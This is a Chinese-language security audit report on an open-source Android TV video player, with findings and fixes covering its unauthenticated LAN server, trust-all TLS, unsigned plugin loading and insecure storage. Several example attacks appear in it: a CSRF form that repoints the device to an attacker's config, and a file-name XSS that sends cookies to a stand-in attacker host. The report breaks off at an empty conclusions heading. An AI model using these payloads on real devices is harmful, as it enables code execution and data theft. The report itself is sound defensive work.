# TVBox (Box) 安卓 TV 影视聚合播放器 — 安全专项审计报告

| 项目 | 内容 |
|------|------|
| 审计对象 | `/workspace/Box`（基于 TVBox 的安卓 TV 影视聚合播放器，AGPL-3.0 开源学习项目） |
| 审计日期 | 2026-10-25 |
| 审计方式 | 纯静态源码审计（只读，未修改任何代码，未执行动态攻击） |
| 审计基准 | OWASP Mobile Top 10 (2024)、MITRE CWE、OWASP Top 10 (2021) |
| 审计范围 | 内置 Web 服务（NanoHTTPD:9978 / AndServer:12345）、动态代码加载（Jar/JS/Py）、网络层（OkHttp/OkGo）、WebView 与 JS 桥接、本地存储（Hawk/Room）、AndroidManifest、Gradle 配置、更新机制、密钥管理 |

## 一、高危发现（High）

### H-1 内置 Web 服务双端口绑定 0.0.0.0 且完全无认证 → 局域网 RCE 攻击链

- **位置**：
  - `app/src/main/java/com/github/tvbox/osc/server/RemoteServer.java:85-90`（构造函数 `super(port)` 未指定 hostname）
  - `app/src/main/java/com/github/tvbox/osc/server/RemoteServer.java:210`（`handleRequest` 无任何认证/Token/来源校验）
  - `app/src/main/java/com/github/tvbox/osc/server/InputRequestProcess.java:44-87`（`POST /action` 的 `do=api/live/epg/proxys/push` 直接透传任意 URL）
  - `app/src/main/java/com/github/tvbox/osc/base/App.java:205-228` + `app/src/main/java/com/github/tvbox/osc/ui/activity/HomeActivity.java:142-143`（HomeActivity `init()` 无条件启动两套服务，用户无感知）
  - `app/src/main/java/com/github/tvbox/osc/server/WebController.kt:19-29`（AndServer `GET /api/updateUrl?url=...` 同样无认证）
- **CWE / OWASP Mobile**：CWE-306（未对关键功能认证）、CWE-284（不当访问控制）；OWASP Mobile M3（Insecure Authentication/Authorization）、M8（Security Misconfiguration）
- **漏洞描述**：
  1. `RemoteServer` 继承 NanoHTTPD，构造时只传入端口（`super(port)`）。NanoHTTPD 在 hostname 为 null 时使用 `new ServerSocket(port)` 默认构造，**监听 0.0.0.0 所有网络接口**，即 TV 盒子的 Wi-Fi/以太网地址。
  2. `AndServer.webServer(instance).port(12345)` 同理绑定所有接口，且该服务在主界面 `init()` 中无条件启动。
  3. 两套服务所有端点（`/action`、`/api/updateUrl`、`/file/`、`/upload`、`/newFolder`、`/delFile`、`/delFolder`、`/proxy`、`/dns-query`、`/m3u8`、`/dash/`）**均无认证、无会话 Token、无设备配对、无 Origin 校验**。任何能 ping 通盒子的局域网设备即为"合法客户端"。
- **利用场景（完整 RCE 链，已按代码逐跳验证）**：

  ```
  攻击者（同一 Wi-Fi）                      TV 盒子（受害者）
  ─────────────────                      ─────────────────
  POST /action  do=api&url=   ───────▶  InputRequestProcess.java:50-53
  http://attacker/config.json            → ControlManager.onApiReceived()
                                         → RefreshEvent(TYPE_API_URL_CHANGE)
                                         → 应用切换数据源为攻击者的 config.json
  config.json 中声明:
    "spider": "http://attacker/x.jar;md5;<hash>"
    "sites": [{"key":"csp_X","api":"csp_X", ...}]
  应用首次使用该源时              ───────▶  JarLoader.getSpider() → loadJarInternal()
                                         → OkGo.get(jar).execute() 下载
                                         → new DexClassLoader(jar, ...)  ← Java 层
                                         → 应用进程内任意代码执行（RCE）
  ```

  - 第 1 跳：`InputRequestProcess.java:51-52` 对 `url` 仅做 `trim()` 非空检查，无任何协议/白名单校验。
  - 第 3 跳：`JarLoader.java:129` `try (Response response = OkGo.<File>get(jar).execute())` 直接下载后于 `JarLoader.java:60` `new DexClassLoader(jar, ...)` 加载执行；md5 校验是可选的（`JarLoader.java:174`，`urls.length > 1` 才生效），且 md5 值就写在攻击者自己提供的 config.json 里，不构成任何约束。
  - 配套能力：`/file/` 可读取整个外部存储（`/storage/emulated/0`，含其他应用 `Android/data` 目录，见 L-7），`/upload` 可向外部存储任意路径写文件并自动解压 zip，`/delFile`/`/delFolder` 可递归删除目录（`RemoteServer.java:343-413`）。即使不利用 RCE，局域网攻击者也可覆盖 TVBox 自身的配置与 spider 缓存文件，达到同等效果。
  - **利用前提**：攻击者与盒子处于同一二层网络（家庭/酒店/宿舍 Wi-Fi）。这在公共 Wi-Fi 场景（盒子带出门、蹭网环境）完全成立。
- **值得肯定的现有防护**（不影响本条评级，但应保留）：`isPathSafe()` 路径穿越规范化校验（`RemoteServer.java:104-115`）、`unzip` 的 Zip Slip 防护（`RemoteServer.java:557-567`）、`/proxy?do=` 分支的 SSRF 过滤（`RemoteServer.java:230-235` + `util/Proxy.java:74-78`）、`/cache` 环回限制。这些挡住了部分横向滥用，但均未触及"无认证"这一根因。
- **修复建议**：
  1. **首选：给控制面加配对 Token**。首次启动生成随机 Token（`SecureRandom`，32 字节 hex），在 TV 屏幕二维码/设置页展示，Web 端所有状态变更接口（`/action`、`/api/updateUrl`、`/upload`、`/del*`、`/newFolder`）强制校验 `X-Pairing-Token` 头：

     ```java
     // ControlManager.init() 中生成一次
     private static String pairingToken;
     public static synchronized String getPairingToken() {
         if (pairingToken == null) {
             byte[] buf = new byte[32];
             new java.security.SecureRandom().nextBytes(buf);
             pairingToken = com.github.tvbox.osc.util.Hex.encode(buf);
         }
         return pairingToken;
     }

     // RemoteServer.handleRequest() 入口处，对敏感端点统一校验
     private static final Set<String> PROTECTED_URIS = new HashSet<>(Arrays.asList(
             "/action", "/upload", "/newFolder", "/delFolder", "/delFile"));
     private boolean isAuthorized(IHTTPSession session, String fileName) {
         if (!PROTECTED_URIS.contains(fileName)) return true;   // 静态资源放行
         return getPairingToken().equals(session.getHeaders().get("x-pairing-token"));
     }
     ```

  2. Web 控制页（`res/raw/index.html`）加载后先弹 Token 输入框，`$.post` 请求统一附加该头（`script.js` 的 `doAction()` 中加入 `beforeSend: xhr => xhr.setRequestHeader('X-Pairing-Token', token)`）。
  3. 提供用户可见开关："允许局域网遥控"（默认关 / 默认仅本机环回）。关闭时 `new RemoteServer(port, context)` 改用 NanoHTTPD 的 `NanoHTTPD(hostname, port)` 构造绑定 `127.0.0.1`，AndServer 同理 `AndServer.webServer(context).inetAddress(InetAddress.getByName("127.0.0.1"))`。
  4. Token 应支持"重置配对"（防止 Token 泄露后长期有效），并对接入设备做简单速率限制（NanoHTTPD 可在 `serve()` 前按 `getRemoteIpAddress()` 计数限频）。

### H-2 全局 TLS 证书与主机名校验禁用（Trust-All）→ MITM 可投毒 spider 插件直接 RCE

- **位置**：
  - `app/src/main/java/com/github/catvod/net/SSLCompat.java:22`（`VERIFIER = (hostname, session) -> true`）
  - `app/src/main/java/com/github/catvod/net/SSLCompat.java:108-122`（`X509TrustManager TM` 的 `checkServerTrusted()` 为空实现，`getAcceptedIssuers()` 返回空数组 —— 接受任意证书）
  - `app/src/main/java/com/github/catvod/net/OkHttp.java:141`（**全局默认客户端**挂载 Trust-All：`.hostnameVerifier(SSLCompat.VERIFIER).sslSocketFactory(new SSLCompat(), SSLCompat.TM)`）
  - `app/src/main/java/com/github/tvbox/osc/util/OkGoHelper.java:253-264`（`setOkHttpSsl()`：`defaultClient`、`noRedirectClient`、`dohClient`、ExoPlayer 客户端全部使用 `SSLCompat.TM` + `HttpsUtils.UnSafeHostnameVerifier`）
  - `app/src/main/java/com/github/catvod/net/OkHttp.java:54`（DoH 客户端同样 Trust-All）
- **CWE / OWASP Mobile**：CWE-295（证书校验不当）、CWE-297（主机名与证书不匹配未校验）；OWASP Mobile M5（Insecure Communication）
- **漏洞描述**：
  - `SSLCompat.java:48-50` 的注释声称"放宽校验仅限显式 new SSLCompat() 接入的 OkHttp 客户端"，但实际 `OkHttp.getBuilder()`（`OkHttp.java:140-144`）是**全应用默认 HTTP 客户端工厂**——`OkHttp.client()` 被所有静态 `newCall/string` 请求使用，`OkGoHelper.init()`（`OkGoHelper.java:214-251`）把 Trust-All 客户端设为 OkGo 全局客户端。也就是说：**除 `UpdateChecker` 走系统 `HttpURLConnection` 外，应用几乎全部 HTTPS 出站流量都接受任意自签/伪造证书**。
  - 受影响的关键数据流包括：spider jar 下载（`JarLoader.java:129`）、jsapi jar 下载（`JsLoader.java:112`）、API 配置 JSON 拉取（ApiConfig 经 OkGo）、视频/图片资源、WebDAV/Alist 网盘请求。
- **利用场景**：
  1. 攻击者在盒子所在网络实施 ARP 欺骗/伪造热点/路由器劫持（家庭场景中恶意 Wi-Fi "免费蹭网"即可）；
  2. 受害者首次添加源或 spider 过期重新下载（`JarLoader.java:123` 的 `FileUtils.isWeekAgo(cache)` 使**每周都会重新联网校验/下载**）；
  3. 攻击者以任意自签证书劫持 `https://` 的 jar 下载请求，返回含 `com.github.catvod.spider.Init` 的恶意 dex jar；
  4. `DexClassLoader` 照常加载 → **无需任何用户配置错误，纯网络位置即获得应用进程 RCE**。同时可窃听所有点播行为、网盘 Basic 凭据。
  - 对比：Python 侧已明确做了正确决策——`pyramid/src/python/app.py:24-26` 注释"严格校验 HTTPS 证书：证书异常即视为下载失败（不做 verify=False 回退），防止中间人投毒插件代码"。Java 侧与该标准不一致，属于同一功能的两套安全基线。
- **修复建议**：
  1. **默认严格校验**：删除 `OkHttp.getBuilder()` 与 `OkGoHelper.setOkHttpSsl()` 中的 `hostnameVerifier`/`sslSocketFactory` 覆盖，使用 OkHttp 默认（系统信任链 + 主机名校验）。
  2. 把"允许证书不匹配的源"做成**按源显式 opt-in** 的降级开关（默认关闭），且仅对"源内容抓取"客户端生效，绝不用于 jar/jsapi 插件下载客户端：

     ```java
     // 插件下载专用客户端：永远严格校验（硬编码，不提供开关）
     public static OkHttpClient pluginClient() {
         return new OkHttpClient.Builder()
                 .connectTimeout(30, TimeUnit.SECONDS)
                 .build();   // 默认信任链 + 默认 HostnameVerifier
     }
     // JarLoader/JsLoader 中替换：
     // try (Response response = OkGo.<File>get(jar).execute()) {
     try (Response response = OkHttp.pluginClient()
             .newCall(new Request.Builder().url(jar).build()).execute()) {
     ```

  3. 若必须兼容自签源站点，至少在 UI 上明确提示"该源证书无效，已跳过校验"，并拒绝 `jar`/`jsapi` 走降级路径（插件 = 代码，代码下载链路必须干净）。

### H-3 动态加载远程 jar / js / py 代码无签名与完整性强校验（供应链 RCE 面）

- **位置**：
  - `app/src/main/java/com/github/catvod/crawler/JarLoader.java:60`（`new DexClassLoader(jar, cacheDir, null, parentClassLoader)`）、`JarLoader.java:108-152`（`loadJarInternal`：md5 可选 + 下载即加载）
  - `app/src/main/java/com/github/catvod/crawler/JsLoader.java:60`、`JsLoader.java:89-136`（同模式 jsapi jar）
  - `pyramid/src/python/app.py:41-70`（`downloadFile`：无哈希校验落盘）、`app.py:119`（`SourceFileLoader(name, fileName).load_module().Spider()` —— 直接执行下载的 Python 源码）
  - `app/src/main/java/com/github/tvbox/osc/api/ApiConfig.java:784-792`（`getCSP` 按 api 后缀 `.js`/`.py`/其他分发到三个加载器）
- **CWE / OWASP Mobile**：CWE-494（下载代码未做完整性校验）；OWASP Mobile M2（Inadequate Supply Chain Security）
- **漏洞描述**：
  1. **无签名机制**：加载的 jar/dex/py/js 完全没有发布方签名或密钥白名单，`DexClassLoader` 赋予插件与宿主同等的 Android 权限（INTERNET、READ/WRITE_EXTERNAL_STORAGE、REQUEST_INSTALL_PACKAGES 等，见 `AndroidManifest.xml:13-21`）。
  2. **完整性校验形同虚设**：`;md5;` 语法是可选的（`JarLoader.java:171-174`），且 md5 由**同一份远端配置**提供——能替换 jar 的人就能同时替换配置里的 md5。MD5 本身也已不适合做完整性保证（见 L-4）。
  3. **缓存信任窗口**：无 md5 时只要缓存文件"一周内"（`FileUtils.isWeekAgo`）就不再联网校验，本地文件篡改（经 H-1 的 `/upload` 或 adb）同样直接生效。
  4. 加载路径 `getFilesDir()/csp/` 虽为应用私有目录，但 targetSdk 28 + legacy storage（见 L-7）下 `/storage/emulated/0` 全区可写，配合 H-1 `/upload` 可间接投放。
- **利用场景**：H-1（换源注入）或 H-2（MITM 投毒）任意一条链成立即可触发本条；此外上游配置分发者（社区"接口分享"生态）本身被投毒时，全部使用者即刻中招——这是 TVBox 生态固有的信任模型问题，本审计不评判生态，但必须指出**代码加载链路缺少任何用户可感知/可验证的信任锚**。
- **修复建议**：
  1. 引入**发布密钥签名**：社区维护一个公钥集合，插件包附带 `sha256 + 签名`，加载前验签（学习 F-Droid / Magisk 模块的签名实践）；至少强制 `sha256` 必填且展示给用户（"该源将安装代码包 xxx，指纹 yyyy"），把"装代码"变成显式授权动作。
  2. jar 下载客户端固定走严格 TLS 客户端（见 H-2 修复 2）。
  3. python 侧把 `SourceFileLoader` 换为"下载 + sha256 比对 + 再加载"两段式；`downloadPlugin()` 接受期望哈希参数并在 `downloadFile()` 中校验：

     ```python
     def downloadFile(name, url, expect_sha256=None):
         ...
         content = rsp.content
         if expect_sha256:
             import hashlib
             actual = hashlib.sha256(content).hexdigest()
             if actual.lower() != expect_sha256.lower():
                 print(name + ' sha256 mismatch: ' + actual)
                 return False
         ...
     ```

## 二、中危发现（Medium）

### M-1 Web 控制接口可被跨站请求伪造（CSRF）—— 局域网恶意网页即可换源

- **位置**：
  - `app/src/main/java/com/github/tvbox/osc/server/RemoteServer.java:310-340`（POST 端点解析，接受 `application/x-www-form-urlencoded`）
  - `app/src/main/java/com/github/tvbox/osc/server/InputRequestProcess.java:37-91`（`/action` 无 Origin/Referer/Token 校验）
  - `app/src/main/java/com/github/tvbox/osc/server/WebController.kt:19-29`（`GET /api/updateUrl` —— GET 型 CSRF，`<img src>` 即可触发）
- **CWE / OWASP Mobile**：CWE-352（CSRF）；OWASP Mobile M4（Insufficient Input/Output Validation）
- **漏洞描述**：`/action` 的 `do=api` 接受 URL 编码表单。`application/x-www-form-urlencoded` 属于 CORS "simple request"——浏览器**不会发起预检**，即使响应被 CORS 拦截，副作用（换源）已经发生。服务端不校验 `Origin`/`Referer`，也没有 CSRF Token。这使 H-1 的攻击面从"局域网内主动攻击者"扩大到"用户手机浏览器访问了任意恶意网页"——受害者自己的浏览器把跨站表单提交给了盒子。
- **利用场景**：用户手机与盒子同网，手机浏览器打开攻击者网页，网页内嵌：

  ```html
  <form action="http://192.168.1.50:9978/action" method="POST" id="f">
    <input name="do" value="api">
    <input name="url" value="http://attacker.example/poison.json">
  </form>
  <script>document.getElementById('f').submit()</script>
  ```

  提交即完成换源（后续链条同 H-1）。GET 型 `GET /api/updateUrl?url=...` 用 `<img src="http://tv-ip:12345/api/updateUrl?url=...">` 同样可静默推送播放地址。
- **修复建议**：
  1. 校验 `Origin`/`Referer`：允许为空（App 自身发起）或与本机地址一致，拒绝携带外站 Origin 的请求：

     ```java
     private boolean isSameOrigin(IHTTPSession session) {
         Map<String, String> h = session.getHeaders();
         String origin = h.get("origin");
         if (origin == null) origin = h.get("referer");
         if (origin == null) return true; // 非浏览器客户端（App/脚本）
         String self = "http://" + session.getHeaders().get("host");
         return origin.startsWith(self);
     }
     ```

  2. 与 H-1 的配对 Token 方案叠加后 CSRF 自动失效（攻击者网页拿不到 Token），但 Origin 校验作为纵深防御仍建议独立实现。
  3. `do=api` 等状态变更动作建议在 TV 屏幕上弹确认（"网页正在请求更换数据源：xxx"），把隐式配置变更显式化。

### M-2 网盘凭据（WebDAV/Alist/SMB）明文存储 + allowBackup 开启

- **位置**：
  - `app/src/main/java/com/github/tvbox/osc/base/App.java:136`（`Hawk.init(this).build()` —— Hawk 2.0.1 默认 SharedPreferences + 明文序列化，未接加密）
  - `app/src/main/java/com/github/tvbox/osc/ui/dialog/WebdavDialog.java:99`（`config.addProperty("password", password)` 明文入 Hawk）
  - `app/src/main/java/com/github/tvbox/osc/ui/dialog/AlistDriveDialog.java:94`（同上）
  - `app/src/main/java/com/github/tvbox/osc/bean/DriveFolderFile.java:125-133`（`getWebDAVBase64Credential()`：`Base64(user:password)` —— 仅编码非加密，Base64 可即时还原）
  - `app/src/main/AndroidManifest.xml:31`（`android:allowBackup="true"`）
- **CWE / OWASP Mobile**：CWE-312（敏感信息明文存储）、CWE-922（不安全的默认初始化）；OWASP Mobile M9（Insecure Data Storage）
- **漏洞描述**：用户在网盘对话框输入的 WebDAV/Alist（及 SMB）账号密码以明文 JSON 形式落在 `/data/data/<pkg>/shared_prefs` 下。`allowBackup="true"` 使任何能接触设备并开启 USB 调试的主体执行 `adb backup -noapk com.github.tvbox.osc.tk` 即可整体导出；云备份通道（厂商 ROM 默认开启的备份）也会把凭据同步到云端。TV 盒子常被放置在客厅等公共区域，物理接触门槛低于手机。
- **利用场景**：`adb backup` 提取 → Hawk 文件中直接看到 `"password":"..."` → 用于登录用户的私有网盘（家庭照片/文件泄露横向扩散）。
- **修复建议**：
  1. 迁移到 `EncryptedSharedPreferences`（AndroidX Security）承载凭据类键：

     ```java
     SharedPreferences esp = EncryptedSharedPreferences.create(
             context, "secure_prefs",
             MasterKey.Builder(context)
                     .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
                     .build(),
             EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
             EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM);
     // 网盘密码走 esp；普通 UI 偏好仍可留在 Hawk
     ```

  2. `AndroidManifest.xml` 设置 `android:allowBackup="false"`（或 `android:fullBackupContent` 指定排除凭据的备份规则）。
  3. 输入框 `etPassword` 确认使用 `TYPE_CLASS_TEXT | TYPE_TEXT_VARIATION_PASSWORD`（防肩窥回显）。

### M-3 嗅探 WebView 开启 File 域跨源访问 + 混合内容全放行 + JS 桥暴露

- **位置**：
  - `app/src/main/java/com/github/tvbox/osc/ui/activity/PlayActivity.java:2062-2064`（`setAllowFileAccess(true)`、`setAllowUniversalAccessFromFileURLs(true)`、`setAllowFileAccessFromFileURLs(true)`；第二处 XWalk 配置 `PlayActivity.java:2260-2262`）
  - `app/src/main/java/com/github/tvbox/osc/ui/fragment/PlayFragment.java:1972-1974`、`PlayFragment.java:2176-2178`（同上，共 4 处）
  - `app/src/main/java/com/github/tvbox/osc/ui/activity/PlayActivity.java:2081`（`setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)`）
  - `app/src/main/java/com/acsbendi/requestinspectorwebview/RequestInspectorJavaScriptInterface.kt:15`（`addJavascriptInterface(this, "RequestInspection")`）
  - `app/src/main/AndroidManifest.xml:142-147`（`xwalk_verify` = `disable`）+ `app/src/main/java/com/github/tvbox/osc/util/XWalkUtils.java:33-37`（XWalk 运行时 zip 从 GitHub 下载后解压执行，无哈希校验）
- **CWE / OWASP Mobile**：CWE-749（暴露危险方法或不安全的移动 UI）；OWASP Mobile M8（Security Misconfiguration）
- **漏洞描述**：
  1. `setAllowUniversalAccessFromFileURLs(true)` + `setAllowFileAccessFromFileURLs(true)` 是 Android 官方明确标注"We strongly discourage"（严重不建议）的组合：一旦 WebView 加载任何 `file://` 内容，该页面 JS 即可读取任意本地文件并跨源外传。本应用嗅探 WebView 加载的解析页 URL 来自用户配置（可被 H-1/M-1 注入），配置中存在 `file://`/本地路径的可能性真实存在（TVBox 生态里 `clan://localhost/` 映射本地文件是常见玩法，`script.js:86` 也显示本地文件会被引用）。
  2. `MIXED_CONTENT_ALWAYS_ALLOW` 使 HTTPS 解析页可加载 HTTP 脚本，给 MITM 注入 JS 提供通道（与 H-2 叠加）。
  3. `RequestInspection` 桥对所有加载页可见：`@JavascriptInterface` 方法仅做请求记录，无敏感操作，且 minSdk 27 不受经典 addJavascriptInterface 反射 RCE（CVE-2012-6636）影响——但恶意页可通过 `recordXhr` 灌入海量伪造请求污染嗅探结果（拒绝服务/错误解析诱导），属低影响暴露面。
  4. XWalk 运行时下载链路（GitHub raw 直链）无完整性校验，且 manifest 中关闭了 XWalk 自身校验。
- **利用场景**：被劫持的解析页返回一段跳转到 `file:///` 的内容或直接本地 HTML → JS 读取 `/data/data/<pkg>/shared_prefs/*.xml`（含 H-2 明文网盘凭据）→ 混合内容或 file 域 XHR 外传。前提是 WebView 能被引导加载 file 域，需要与源配置串通，故评中危而非高危。
- **修复建议**：
  1. 三项 File 访问开关全部置 `false`（嗅探场景加载 http/https 页面不需要 file 域）；如确需读本地字幕/字体，改用 `WebViewAssetLoader`（`https://appassets.androidplatform.net` 域代理本地资源），这是官方推荐的 file:// 替代。
  2. `MIXED_CONTENT_ALWAYS_ALLOW` 改 `MIXED_CONTENT_NEVER_ALLOW`。
  3. `addJavascriptInterface` 前用 `WebViewCompat.setWebViewAssetLoader`/域名白名单限制桥仅注入可信页（`RequestInspectorJavaScriptInterface` 可仅在 URL 匹配用户配置的 parse 域名时注入）。
  4. XWalk 下载直链加 sha256 校验，或直接随 APK 打包运行时（`xwalk_shared_library-23.53.589.4.aar` 已在 `app/libs/`，确认运行时是否必须在线下载）。

### M-4 APK 自动更新无哈希/签名校验

- **位置**：
  - `app/src/main/java/com/github/tvbox/osc/util/UpdateChecker.java:301-386`（`downloadApk`：仅校验 HTTP 状态码与 `contentLength`，无 SHA-256、无签名比对）
  - `app/src/main/java/com/github/tvbox/osc/util/UpdateChecker.java:43-47`（更新元数据与 APK 均来自 Gitee 仓库/Release）
- **CWE / OWASP Mobile**：CWE-494（下载代码未做完整性校验）；OWASP Mobile M2
- **漏洞描述**：更新检查与下载使用系统 `HttpURLConnection`（默认信任链，未受 H-2 污染——`SSLCompat.java:48-50` 注释确认未调用 `setDefaultSSLSocketFactory` 污染全局，这点做得对），传输层有保障。但应用层无完整性校验：`output-metadata.json` 不含哈希字段，代码也未校验下载 APK 的签名指纹与已安装应用一致。Android 包安装器会阻止"签名不一致的覆盖安装"，构成兜底；但**卸载重装 / 首次安装场景 / Gitee 账号被盗**时无任何防护，且用户无从发现被替换。
- **利用场景**：Gitee 仓库或发布账号被接管 → 推送带恶意代码的"新版本" → 所有点击更新的用户安装恶意 APK（Android 会因签名不同而拒绝升级已装用户，但新用户/重装用户中招；也可诱导先卸载）。
- **修复建议**：
  1. 元数据中增加 `sha256` 字段并在安装前校验：

     ```java
     // downloadApk() 写盘完成后：
     String expect = elementObject.optString("sha256", "");
     if (!expect.isEmpty()) {
         String actual = sha256OfFile(outputFile);
         if (!actual.equalsIgnoreCase(expect)) {
             outputFile.delete();
             Log.e(TAG, "APK sha256 mismatch, abort install");
             return null;
         }
     }
     ```

  2. 更进一步：在元数据中附带 APK 签名证书指纹（SHA-256），安装前用 `PackageManager.GET_SIGNATURES` 比对与当前应用一致，防止 Gitee 侧被换签名包。
  3. 断点续传逻辑（`UpdateChecker.java:311-321`）注意：`Range` 续传叠加哈希校验时，校验必须针对完整文件计算（当前实现 `total` 从 `alreadyDownloaded` 起算，哈希应基于最终完整文件流）。

### M-5 全局明文流量许可（base-config 放行所有 http）

- **位置**：
  - `app/src/main/res/xml/network_security_config.xml:3`（`<base-config cleartextTrafficPermitted="true" />`）
  - `app/src/main/AndroidManifest.xml:43`（`android:usesCleartextTraffic="true"`，与 networkSecurityConfig 并存）
  - `app/src/main/java/com/github/tvbox/osc/util/OkGoHelper.java:88-92`（`ConnectionSpec` 列表含 `CLEARTEXT`，注释承认"IPTV/直播源生态以 http:// 明文地址为主"）
- **CWE / OWASP Mobile**：CWE-319（明文传输敏感信息）；OWASP Mobile M5
- **漏洞描述**：以 `base-config` 粒度全局放行明文 HTTP，等于放弃了 Android 7+ 网络安全配置提供的任何收口能力。直播生态确实大量存在 `http://` 源（功能性现实），但配置 JSON、spider jar、图片等同样可以走明文——`JarLoader.java:129` 并不限制 jar URL 协议，`http://` 的 jar 下载在网络路径上任意可被替换（无需攻破 TLS，因为根本没有 TLS）。
- **利用场景**：用户配置了 `http://` 的接口地址（社区分享的接口很多是 http）→ 同网攻击者直接替换响应 → 换源/投毒 jar（效果等同 H-2 的 MITM，但门槛更低：无需伪造证书，明文链路即可改包）。
- **修复建议**：
  1. 改为"默认拒绝明文 + 白名单放行"粒度：`base-config` 设 `cleartextTrafficPermitted="false"`，对确需明文的直播 CDN 域名用 `<domain-config>` 逐个放行；对未知域名运行时按用户显式勾选"允许该源使用 http"动态决定（OkHttp 层可按 URL scheme 分流到 CLEARTEXT/RESTRICTED_TLS 两个 ConnectionSpec 客户端）。
  2. **代码类下载（jar/jsapi/py）无条件强制 https**：在 `JarLoader.loadJarInternal`/`JsLoader.loadJarInternal`/`pyramid downloadPlugin` 入口校验 `jar.startsWith("https://")` 或 `file://` 本地路径，拒绝 `http://`。

## 三、低危发现（Low）

### L-1 三个导出 Receiver 无权限保护，可被任意应用触发

- **位置**：`app/src/main/AndroidManifest.xml:106-123`（`SearchReceiver`/`DetailReceiver`/`CustomWebReceiver` 均 `exported="true"` 且未声明 `android:permission`）
- **CWE / OWASP Mobile**：CWE-926（不安全的组件导出）；OWASP Mobile M8
- **描述与利用**：设备上任意恶意 App 可发送 `android.content.movie.detail.Action` 广播携带任意 `id`/`sourceKey`（`DetailReceiver.java:22-33`），强制把盒子界面拉到指定影视详情页（钓鱼：伪造"会员充值"类页面跳转链），或 `SearchReceiver.java:23-32` 触发任意关键词搜索。`CustomWebReceiver.java:30-43` 分支全部为空 `return`，无实际风险（建议顺带移除或 `exported=false`）。
- **修复**：三处 receiver 加 `android:exported="false"`（它们本就配合 `setComponent` 显式调用，`ControlManager.java:74-75` 已用显式 ComponentName，导出毫无必要）；若需保留外部唤起能力，声明自定义签名级 `permission`。

### L-2 /dns-query 端点未限制环回客户端

- **位置**：`app/src/main/java/com/github/tvbox/osc/server/RemoteServer.java:268-280`
- **CWE**：CWE-284
- **描述与利用**：`/cache`、`/proxy?do=` 已用 `isLoopbackClient()` 收口，但 `/dns-query` 未限制——局域网任意客户端可把盒子当开放 DoH 解析器（`OkGoHelper.lookupHttpsForwardSync`），用于隐藏自身 DNS 查询、探测内网域名是否存在等。影响有限但属于设计外暴露。
- **修复**：`if (!isLoopbackClient(session)) return forbidden();` 与 `/cache` 保持一致。

### L-3 SSRF 过滤存在 DNS Rebinding 绕过缺口（代码注释已自认）

- **位置**：`app/src/main/java/com/github/tvbox/osc/util/Proxy.java:33-35`（注释"不能替代 DNS rebinding 等高级 SSRF 防护"）、`Proxy.java:37-53`（`isSafeExternalUrl`：解析一次 IP 判定后放行，实际请求时重新解析）
- **CWE / OWASP Mobile**：CWE-918（SSRF）；OWASP Mobile M4
- **描述与利用**：`/proxy?go=SuperParse` 分支（`RemoteServer.java:239-242`）对非环回客户端有私网/回环/链路本地过滤，但攻击者控制权威 DNS 可在"校验解析"（返回公网 IP）与"实际连接"（TTL=0 重解析为 169.254.169.254 或 10.x）之间翻转结果，穿透校验访问内网/路由器管理页。`/proxy?do=` 分支同理。
- **修复**：校验后把解析出的 IP 固定下来发起连接（自定义 `OkHttpClient.Builder().dns()` 或 `HttpUrl` 重建为字面量 IP + SNI 保持域名），即"校验即连接同一解析结果"；或引入二次解析比对。

### L-4 MD5 用作插件完整性哈希

- **位置**：`app/src/main/java/com/github/catvod/crawler/JarLoader.java:115`、`app/src/main/java/com/github/tvbox/osc/util/MD5.java:29-36`
- **CWE / OWASP Mobile**：CWE-327（使用有风险的加密算法）；OWASP Mobile M10（Insufficient Cryptography）
- **描述**：MD5 选择前缀碰撞攻击成本已商品化，作为对抗性完整性校验不可靠；且本项目中 md5 与被校验对象同源（同一份配置），仅能防"传输误码"级别问题。
- **修复**：与 H-3 一并处理，升级为 SHA-256 且必填。

### L-5 Web 控制页文件列表 HTML 拼接（存储型 XSS）

- **位置**：`app/src/main/res/raw/script.js:38-66`（`tpl_dir`/`tpl_file` 将 `name`、`path` 未转义拼入 HTML）
- **CWE / OWASP Mobile**：CWE-79（XSS）；OWASP Mobile M4
- **描述与利用**：经 `/upload`（H-1）上传名为 `<img src=x onerror=fetch('http://attacker/?c='+document.cookie)>` 的文件 → 受害者手机浏览控制页文件列表（`/file/` 返回 JSON，`script.js` 渲染）→ 恶意文件名作为 HTML 执行。当前控制页虽无 Cookie 可窃，但 XSS 上下文可静默调用 `doAction('api', …)` 换源，是 H-1 的"人机交互触发"补充路径。
- **修复**：渲染前对插值做 HTML 转义（`String(name).replace(/[&<>"']/g, …)`），或改用 `textContent`/`createElement` 构建 DOM。

### L-6 使用停止维护的旧版 SMB 客户端 jcifs 1.3.19

- **位置**：`gradle/libs.versions.toml:47`（`jcifs = "1.3.19"`）
- **CWE / OWASP Mobile**：CWE-1104（使用未维护的第三方组件）；OWASP Mobile M2
- **描述**：Eclipse jetstream 前的旧 jcifs，最后发布于 2015 年，默认仅支持 SMB1（存在 EternalBlue 时代的协议级风险面，作为客户端连接不受信任 SMB 服务器时可能被恶意服务器响应利用），且不再接收安全补丁。
- **修复**：迁移到 `jcifs-ng`（或 `smbj`），禁用 SMB1 仅协商 SMB2/3；同时注意 SMB 凭据同样落入明文 Hawk（随 M-2 一并加密）。

### L-7 targetSdk 28 + requestLegacyExternalStorage 放大文件端点影响面

- **位置**：`app/build.gradle:24`（`targetSdkVersion 28`，`build.gradle:125-126` 注释表明为保持旧运行时行为有意为之）、`app/src/main/AndroidManifest.xml:42`
- **CWE / OWASP Mobile**：CWE-693（防护机制失效）；OWASP Mobile M8
- **描述**：targetSdk 28 使应用运行在旧存储模型下：`READ/WRITE_EXTERNAL_STORAGE` 授权后可读写整个 `/storage/emulated/0`（含其他应用的 `Android/data/<pkg>/` 外部私有目录）。这直接放大了 H-1 中 `/file/`、`/upload` 端点的横向能力（读写其他 TV 应用数据），也绕过了 scoped storage 等现代隔离。
- **修复**：制定 targetSdk 升级路径（哪怕先到 30/33），用 `requestLegacyExternalStorage=false` + SAF/`getExternalFilesDir` 收敛自身读写；Web 端 `/file/`、`/upload` 的根目录从"整个外部存储"收窄到 `getExternalFilesDir()` 或专用子目录（如 `/storage/emulated/0/TV`），配 `isPathSafe` 现有逻辑。

## 六、核心结论

